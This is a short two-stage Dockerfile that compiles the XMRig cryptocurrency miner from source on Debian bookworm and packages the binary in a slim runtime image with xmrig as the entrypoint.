FROM debian:bookworm as builder

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
RUN mkdir /app
WORKDIR /app
COPY . /app
RUN mkdir /app/build && cd /app/build && cmake .. && make -j$(nproc)

FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y libuv1-dev libssl-dev libhwloc-dev
RUN mkdir /app
COPY --from=builder /app/build/xmrig /app

WORKDIR /app
ENTRYPOINT ["/app/xmrig"]
